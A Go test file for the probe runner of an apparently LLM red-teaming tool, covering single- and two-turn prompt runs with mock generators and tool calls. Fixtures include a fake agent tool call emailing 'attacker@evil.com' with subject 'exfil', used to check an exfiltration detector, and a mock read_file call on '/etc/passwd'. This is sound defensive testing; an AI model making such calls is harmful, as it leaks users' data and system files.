package probes_test

import (
	"context"
	"errors"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	agentdet "github.com/praetorian-inc/augustus/internal/detectors/agent"
	"github.com/praetorian-inc/augustus/pkg/attempt"
	"github.com/praetorian-inc/augustus/pkg/probes"
	"github.com/praetorian-inc/augustus/pkg/registry"
)

// mockGen is a mock implementation of types.Generator for testing.
type mockGen struct {
	generateFunc func(ctx context.Context, conv *attempt.Conversation, n int) ([]attempt.Message, error)
	err          error
}

func (m *mockGen) Generate(ctx context.Context, conv *attempt.Conversation, n int) ([]attempt.Message, error) {
	if m.generateFunc != nil {
		return m.generateFunc(ctx, conv, n)
	}
	if m.err != nil {
		return nil, m.err
	}
	return []attempt.Message{{Content: "mock response"}}, nil
}

func (m *mockGen) ClearHistory() {}

func (m *mockGen) Name() string {
	return "mock-generator"
}

func (m *mockGen) Description() string {
	return "Mock generator for testing"
}

func TestRunPrompts_Basic(t *testing.T) {
	gen := &mockGen{}
	prompts := []string{"prompt1", "prompt2", "prompt3"}

	attempts, err := probes.RunPrompts(context.Background(), gen, prompts, "test-probe", "test-detector", nil, nil)

	require.NoError(t, err)
	assert.Len(t, attempts, 3, "should return one attempt per prompt")

	for i, att := range attempts {
		assert.Equal(t, prompts[i], att.Prompt, "prompt should match input")
		assert.Equal(t, []string{prompts[i]}, att.Prompts, "prompts slice should contain single prompt")
		assert.Equal(t, []string{"mock response"}, att.Outputs, "should contain generator response")
		assert.Equal(t, attempt.StatusComplete, att.Status, "status should be complete")
		assert.Empty(t, att.Error, "error should be empty")
		assert.Equal(t, "test-probe", att.Probe, "probe name should be set")
		assert.Equal(t, "test-detector", att.Detector, "detector should be set")
	}
}

func TestRunPrompts_GeneratorError(t *testing.T) {
	expectedErr := errors.New("generation failed")
	gen := &mockGen{err: expectedErr}
	prompts := []string{"prompt1"}

	attempts, err := probes.RunPrompts(context.Background(), gen, prompts, "test-probe", "test-detector", nil, nil)

	require.NoError(t, err, "RunPrompts should not return error on generation failure")
	require.Len(t, attempts, 1)

	att := attempts[0]
	assert.Equal(t, attempt.StatusError, att.Status, "status should be error")
	assert.Contains(t, att.Error, "generation failed", "error message should contain generator error")
	assert.Empty(t, att.Outputs, "outputs should be empty on error")
}

func TestRunPrompts_ContextCancellation(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel immediately

	gen := &mockGen{}
	prompts := []string{"prompt1"}

	attempts, err := probes.RunPrompts(ctx, gen, prompts, "test-probe", "test-detector", nil, nil)

	require.Error(t, err, "should return error when context is cancelled")
	assert.Contains(t, err.Error(), "context canceled", "error should indicate context cancellation")
	assert.Empty(t, attempts, "should not return attempts when context cancelled")
}

func TestRunPrompts_MetadataFn(t *testing.T) {
	gen := &mockGen{}
	prompts := []string{"prompt1", "prompt2"}

	// MetadataFn that adds custom metadata to each attempt
	metadataFn := func(i int, prompt string, att *attempt.Attempt) {
		att.Metadata["test_key"] = "test_value"
		att.Metadata["prompt_length"] = len(prompt)
		att.Metadata["index"] = i
	}

	attempts, err := probes.RunPrompts(context.Background(), gen, prompts, "test-probe", "test-detector", metadataFn, nil)

	require.NoError(t, err)
	require.Len(t, attempts, 2)

	for i, att := range attempts {
		// Verify custom metadata was added
		assert.Equal(t, "test_value", att.Metadata["test_key"], "custom metadata should be present")
		assert.Equal(t, len(prompts[i]), att.Metadata["prompt_length"], "prompt length should be recorded")
		assert.Equal(t, i, att.Metadata["index"], "index should be recorded")
	}
}

func TestRunPrompts_EmptyPrompts(t *testing.T) {
	gen := &mockGen{}
	prompts := []string{}

	attempts, err := probes.RunPrompts(context.Background(), gen, prompts, "test-probe", "test-detector", nil, nil)

	require.NoError(t, err)
	assert.Empty(t, attempts, "should return empty slice for empty prompts")
}

// TestToolCallsBridge_GeneratorMetadataDetector_RoundTrip is the integration
// test that would have FAILED on commit 65bb093 (pre-bridge).
//
// Before the bridge (65bb093), generators returned tool calls in a
// provider-specific format (e.g. goopenai.ToolCall) that was never written into
// attempt.Metadata[MetadataKeyToolCalls]. Detector unit tests were seeding that
// metadata directly, so they passed even though no generator ever wrote it.
// This test closes the gap by exercising the full pipeline:
//
//  1. A mock generator returns an attempt.Message with ToolCalls already in the
//     canonical shape (as produced by attackengine.NormalizeOpenAIToolCalls).
//  2. RunPrompts propagates those ToolCalls into attempt.Metadata via the
//     collectToolCalls/WithMetadata bridge path.
//  3. agent.ArgumentExfiltrationDetector reads the metadata and fires a score
//     of 1.0 because the argument contains a forbidden domain.
//
// On pre-bridge code the mock generator's ToolCalls would never reach the
// attempt metadata, the detector would see no tool calls, and all scores would
// be 0.0 — causing the assertion below to fail.
func TestToolCallsBridge_GeneratorMetadataDetector_RoundTrip(t *testing.T) {
	// Build the canonical tool-call shape — this is exactly what the real
	// openai generator stores in Message.ToolCalls after calling
	// attackengine.NormalizeOpenAIToolCalls. We verify that NormalizeOpenAIToolCalls
	// produces this shape in the unit tests in internal/attackengine/toolcalls_test.go.
	// Here we confirm the shape flows end-to-end through RunPrompts into the detector.
	canonicalToolCalls := []map[string]any{
		{
			"name": "send_email",
			"args": map[string]any{
				"to":      "attacker@evil.com",
				"subject": "exfil",
			},
		},
	}

	// Step 2: Mock generator returns a message carrying the canonical tool calls.
	gen := &mockGen{
		generateFunc: func(_ context.Context, _ *attempt.Conversation, _ int) ([]attempt.Message, error) {
			msg := attempt.Message{
				Role:      attempt.RoleAssistant,
				Content:   "",
				ToolCalls: canonicalToolCalls,
			}
			return []attempt.Message{msg}, nil
		},
	}

	// RunPrompts exercises the bridge: it calls collectToolCalls(responses) and
	// a.WithMetadata(attempt.MetadataKeyToolCalls, ...).
	attempts, err := probes.RunPrompts(
		context.Background(),
		gen,
		[]string{"exfil sensitive data"},
		"agent.exfil-probe",
		"agent.ArgumentExfiltration",
		nil,
		nil,
	)
	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	assert.Equal(t, attempt.StatusComplete, a.Status)

	// Verify the bridge wrote the tool calls into metadata.
	rawMeta, ok := a.Metadata[attempt.MetadataKeyToolCalls]
	require.True(t, ok, "bridge must write tool_calls into attempt metadata; pre-bridge code never did this")

	metaSlice, ok := rawMeta.([]map[string]any)
	require.True(t, ok, "tool_calls metadata must be []map[string]any")
	require.Len(t, metaSlice, 1)
	assert.Equal(t, "send_email", metaSlice[0]["name"])

	// Step 3: Run the real detector against the attempt produced by RunPrompts.
	// The attempt already has one output from the generator (empty content string);
	// the detector scores one entry per output.
	require.Len(t, a.Outputs, 1, "RunPrompts should have recorded the generator's response")

	det, err := agentdet.NewArgumentExfiltration(registry.Config{})
	require.NoError(t, err)

	scores, err := det.Detect(context.Background(), a)
	require.NoError(t, err)
	require.Len(t, scores, 1)
	assert.Equal(t, 1.0, scores[0],
		"detector must score 1.0 when tool call argument contains a forbidden domain; "+
			"on pre-bridge code (65bb093) metadata was never populated so this would be 0.0")
}

// standardTwoTurnArgs returns the common args shared across RunTwoTurnPrompts tests.
func standardTwoTurnArgs() ([]string, string, string, []map[string]any, string, map[string]string) {
	prompts := []string{"test prompt"}
	probeName := "test-probe"
	detector := "test-detector"
	tools := []map[string]any{{"name": "web_search", "description": "search"}}
	toolChoice := "auto"
	toolResults := map[string]string{"web_search": "search result data"}
	return prompts, probeName, detector, tools, toolChoice, toolResults
}

// TestRunTwoTurnPrompts_MatchingToolCall verifies the full two-turn flow when
// the model returns a tool call on Turn 1 that matches a canned result.
func TestRunTwoTurnPrompts_MatchingToolCall(t *testing.T) {
	prompts, probeName, detector, tools, toolChoice, toolResults := standardTwoTurnArgs()

	callCount := 0
	gen := &mockGen{
		generateFunc: func(_ context.Context, _ *attempt.Conversation, _ int) ([]attempt.Message, error) {
			callCount++
			if callCount == 1 {
				return []attempt.Message{
					{
						Role:    attempt.RoleAssistant,
						Content: "",
						ToolCalls: []map[string]any{
							{"name": "web_search", "id": "call_1", "args": map[string]any{"q": "test"}},
						},
					},
				}, nil
			}
			return []attempt.Message{{Content: "Based on the results..."}}, nil
		},
	}

	attempts, err := probes.RunTwoTurnPrompts(context.Background(), gen, prompts, probeName, detector, tools, toolChoice, toolResults)

	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	assert.Equal(t, attempt.StatusComplete, a.Status)
	// Turn 1 adds empty content, Turn 2 adds "Based on the results..."
	require.Len(t, a.Outputs, 2)
	assert.Equal(t, "", a.Outputs[0])
	assert.Equal(t, "Based on the results...", a.Outputs[1])

	rawMeta, ok := a.Metadata[attempt.MetadataKeyToolCalls]
	require.True(t, ok, "tool_calls metadata must be present after matching tool call")
	metaSlice, ok := rawMeta.([]map[string]any)
	require.True(t, ok)
	assert.GreaterOrEqual(t, len(metaSlice), 1)
}

// TestRunTwoTurnPrompts_NoToolCalls verifies that when the model returns only
// text (no tool calls), the attempt records one output and no tool_calls metadata.
func TestRunTwoTurnPrompts_NoToolCalls(t *testing.T) {
	prompts, probeName, detector, tools, toolChoice, toolResults := standardTwoTurnArgs()

	gen := &mockGen{
		generateFunc: func(_ context.Context, _ *attempt.Conversation, _ int) ([]attempt.Message, error) {
			return []attempt.Message{{Content: "I can't use tools"}}, nil
		},
	}

	attempts, err := probes.RunTwoTurnPrompts(context.Background(), gen, prompts, probeName, detector, tools, toolChoice, toolResults)

	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	assert.Equal(t, attempt.StatusComplete, a.Status)
	require.Len(t, a.Outputs, 1)
	assert.Equal(t, "I can't use tools", a.Outputs[0])
	_, hasToolCalls := a.Metadata[attempt.MetadataKeyToolCalls]
	assert.False(t, hasToolCalls, "tool_calls metadata must not be present when model returns no tool calls")
}

// TestRunTwoTurnPrompts_UnmatchedToolName verifies that when the model calls a
// tool not present in toolResults, Turn 2 is skipped but Turn 1 tool calls are
// still recorded in metadata.
func TestRunTwoTurnPrompts_UnmatchedToolName(t *testing.T) {
	prompts, probeName, detector, tools, toolChoice, _ := standardTwoTurnArgs()
	// toolResults only has "web_search"; model calls "calculator" — no match.
	toolResults := map[string]string{"web_search": "search result data"}

	gen := &mockGen{
		generateFunc: func(_ context.Context, _ *attempt.Conversation, _ int) ([]attempt.Message, error) {
			return []attempt.Message{
				{
					Role:    attempt.RoleAssistant,
					Content: "",
					ToolCalls: []map[string]any{
						{"name": "calculator", "id": "call_calc", "args": map[string]any{}},
					},
				},
			}, nil
		},
	}

	attempts, err := probes.RunTwoTurnPrompts(context.Background(), gen, prompts, probeName, detector, tools, toolChoice, toolResults)

	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	assert.Equal(t, attempt.StatusComplete, a.Status)
	// Turn 2 must NOT have fired: only one output (from Turn 1).
	assert.Len(t, a.Outputs, 1)

	rawMeta, ok := a.Metadata[attempt.MetadataKeyToolCalls]
	require.True(t, ok, "tool_calls from Turn 1 must still be recorded even without a match")
	metaSlice, ok := rawMeta.([]map[string]any)
	require.True(t, ok)
	require.Len(t, metaSlice, 1)
	assert.Equal(t, "calculator", metaSlice[0]["name"])
}

// TestRunTwoTurnPrompts_Turn1Error verifies that a generator error on Turn 1
// produces a single attempt with StatusError and no outputs.
func TestRunTwoTurnPrompts_Turn1Error(t *testing.T) {
	prompts, probeName, detector, tools, toolChoice, toolResults := standardTwoTurnArgs()

	gen := &mockGen{
		generateFunc: func(_ context.Context, _ *attempt.Conversation, _ int) ([]attempt.Message, error) {
			return nil, errors.New("api error")
		},
	}

	attempts, err := probes.RunTwoTurnPrompts(context.Background(), gen, prompts, probeName, detector, tools, toolChoice, toolResults)

	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	assert.Equal(t, attempt.StatusError, a.Status)
	assert.Contains(t, a.Error, "api error")
	assert.Empty(t, a.Outputs)
}

// TestRunTwoTurnPrompts_Turn2Error verifies that when Turn 1 succeeds with a
// matching tool call but Turn 2 returns an error, Turn 1 outputs are preserved
// and "turn2_error" metadata is recorded.
func TestRunTwoTurnPrompts_Turn2Error(t *testing.T) {
	prompts, probeName, detector, tools, toolChoice, toolResults := standardTwoTurnArgs()

	callCount := 0
	gen := &mockGen{
		generateFunc: func(_ context.Context, _ *attempt.Conversation, _ int) ([]attempt.Message, error) {
			callCount++
			if callCount == 1 {
				return []attempt.Message{
					{
						Role:    attempt.RoleAssistant,
						Content: "",
						ToolCalls: []map[string]any{
							{"name": "web_search", "id": "call_ws", "args": map[string]any{}},
						},
					},
				}, nil
			}
			return nil, errors.New("turn2 api error")
		},
	}

	attempts, err := probes.RunTwoTurnPrompts(context.Background(), gen, prompts, probeName, detector, tools, toolChoice, toolResults)

	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	// Turn 1 succeeded so the attempt is Complete (not Error).
	assert.Equal(t, attempt.StatusComplete, a.Status)
	// Turn 1 output must be preserved.
	assert.NotEmpty(t, a.Outputs)
	// turn2_error metadata must be set.
	_, hasTurn2Err := a.Metadata["turn2_error"]
	assert.True(t, hasTurn2Err, "turn2_error metadata must be set when Turn 2 fails")
}

// TestRunTwoTurnPrompts_ContextCancellation verifies that a cancelled context
// causes an early return with an error before any prompt is processed.
func TestRunTwoTurnPrompts_ContextCancellation(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel before processing begins.

	_, probeName, detector, tools, toolChoice, toolResults := standardTwoTurnArgs()
	prompts := []string{"test prompt"}

	gen := &mockGen{}

	attempts, err := probes.RunTwoTurnPrompts(ctx, gen, prompts, probeName, detector, tools, toolChoice, toolResults)

	require.Error(t, err, "cancelled context must produce an error")
	assert.Empty(t, attempts, "no attempts should be returned when context is cancelled before any prompt")
}

// TestRunTwoTurnPrompts_FallbackToolCallID verifies that when the model returns
// a tool call with an empty id, RunTwoTurnPrompts generates a fallback id of
// "call_" + toolName, which still allows Turn 2 to fire.
func TestRunTwoTurnPrompts_FallbackToolCallID(t *testing.T) {
	prompts, probeName, detector, tools, toolChoice, toolResults := standardTwoTurnArgs()

	callCount := 0
	gen := &mockGen{
		generateFunc: func(_ context.Context, _ *attempt.Conversation, _ int) ([]attempt.Message, error) {
			callCount++
			if callCount == 1 {
				return []attempt.Message{
					{
						Role:    attempt.RoleAssistant,
						Content: "",
						ToolCalls: []map[string]any{
							{"name": "web_search", "id": "", "args": map[string]any{}},
						},
					},
				}, nil
			}
			return []attempt.Message{{Content: "fallback id worked"}}, nil
		},
	}

	attempts, err := probes.RunTwoTurnPrompts(context.Background(), gen, prompts, probeName, detector, tools, toolChoice, toolResults)

	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	assert.Equal(t, attempt.StatusComplete, a.Status)
	// Turn 2 must have fired — two outputs present.
	require.Len(t, a.Outputs, 2, "Turn 2 must fire even when tool call id is empty (fallback id used)")
	assert.Equal(t, "fallback id worked", a.Outputs[1])
}

// TestRunTwoTurnPrompts_MultipleToolCalls verifies that when Turn 1 returns two
// tool calls, RunTwoTurnPrompts injects exactly one RoleTool turn per call:
// the matched call (web_search, present in toolResults) gets its canned result
// and the unmatched call (read_file, absent from toolResults) gets the generic stub.
func TestRunTwoTurnPrompts_MultipleToolCalls(t *testing.T) {
	_, probeName, detector, tools, toolChoice, _ := standardTwoTurnArgs()
	prompts := []string{"test prompt"}
	// toolResults only has web_search; read_file is unmatched.
	toolResults := map[string]string{"web_search": "search result data"}

	var turn2Conv *attempt.Conversation
	callCount := 0
	gen := &mockGen{
		generateFunc: func(_ context.Context, conv *attempt.Conversation, _ int) ([]attempt.Message, error) {
			callCount++
			if callCount == 1 {
				return []attempt.Message{
					{
						Role:    attempt.RoleAssistant,
						Content: "",
						ToolCalls: []map[string]any{
							{"name": "web_search", "id": "call_ws", "args": map[string]any{"q": "test"}},
							{"name": "read_file", "id": "call_rf", "args": map[string]any{"path": "/etc/passwd"}},
						},
					},
				}, nil
			}
			turn2Conv = conv
			return []attempt.Message{{Content: "got all tool results"}}, nil
		},
	}

	attempts, err := probes.RunTwoTurnPrompts(context.Background(), gen, prompts, probeName, detector, tools, toolChoice, toolResults)

	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	assert.Equal(t, attempt.StatusComplete, a.Status)
	require.Len(t, a.Outputs, 2, "Turn 2 must have fired: two outputs expected")
	assert.Equal(t, "got all tool results", a.Outputs[1])

	rawMeta, ok := a.Metadata[attempt.MetadataKeyToolCalls]
	require.True(t, ok, "MetadataKeyToolCalls must be present after two tool calls")
	metaSlice, ok := rawMeta.([]map[string]any)
	require.True(t, ok, "tool_calls metadata must be []map[string]any")
	assert.Len(t, metaSlice, 2, "MetadataKeyToolCalls must record both tool calls")

	// Inspect the conversation presented to Turn 2 to verify one RoleTool turn per call.
	require.NotNil(t, turn2Conv, "Turn 2 generate must have been called")
	var roleToolTurns []attempt.Turn
	for _, turn := range turn2Conv.Turns {
		if turn.Prompt.Role == attempt.RoleTool {
			roleToolTurns = append(roleToolTurns, turn)
		}
	}
	assert.Len(t, roleToolTurns, 2, "turn2Conv must have exactly 2 RoleTool turns")

	resultsByID := make(map[string]string)
	for _, turn := range roleToolTurns {
		resultsByID[turn.Prompt.ToolCallID] = turn.Prompt.Content
	}
	assert.Equal(t, "search result data", resultsByID["call_ws"], "matched call must get canned result")
	assert.Equal(t, `{"status": "ok"}`, resultsByID["call_rf"], "unmatched call must get generic stub")
}

// TestRunTwoTurnPrompts_MultipleToolCalls_BothMatch verifies that when Turn 1
// returns two tool calls and toolResults maps both names, each call receives
// its own canned result rather than the generic stub.
func TestRunTwoTurnPrompts_MultipleToolCalls_BothMatch(t *testing.T) {
	_, probeName, detector, tools, toolChoice, _ := standardTwoTurnArgs()
	prompts := []string{"test prompt"}
	// Both tool calls have canned results.
	toolResults := map[string]string{
		"web_search": "search result data",
		"read_file":  "file contents here",
	}

	var turn2Conv *attempt.Conversation
	callCount := 0
	gen := &mockGen{
		generateFunc: func(_ context.Context, conv *attempt.Conversation, _ int) ([]attempt.Message, error) {
			callCount++
			if callCount == 1 {
				return []attempt.Message{
					{
						Role:    attempt.RoleAssistant,
						Content: "",
						ToolCalls: []map[string]any{
							{"name": "web_search", "id": "call_ws", "args": map[string]any{}},
							{"name": "read_file", "id": "call_rf", "args": map[string]any{}},
						},
					},
				}, nil
			}
			turn2Conv = conv
			return []attempt.Message{{Content: "processed both tools"}}, nil
		},
	}

	attempts, err := probes.RunTwoTurnPrompts(context.Background(), gen, prompts, probeName, detector, tools, toolChoice, toolResults)

	require.NoError(t, err)
	require.Len(t, attempts, 1)

	a := attempts[0]
	assert.Equal(t, attempt.StatusComplete, a.Status)
	require.Len(t, a.Outputs, 2, "Turn 2 must have fired: two outputs expected")
	assert.Equal(t, "processed both tools", a.Outputs[1])

	require.NotNil(t, turn2Conv, "Turn 2 generate must have been called")
	var roleToolTurns []attempt.Turn
	for _, turn := range turn2Conv.Turns {
		if turn.Prompt.Role == attempt.RoleTool {
			roleToolTurns = append(roleToolTurns, turn)
		}
	}
	assert.Len(t, roleToolTurns, 2, "turn2Conv must have exactly 2 RoleTool turns")

	resultsByID := make(map[string]string)
	for _, turn := range roleToolTurns {
		resultsByID[turn.Prompt.ToolCallID] = turn.Prompt.Content
	}
	assert.Equal(t, "search result data", resultsByID["call_ws"])
	assert.Equal(t, "file contents here", resultsByID["call_rf"])
}
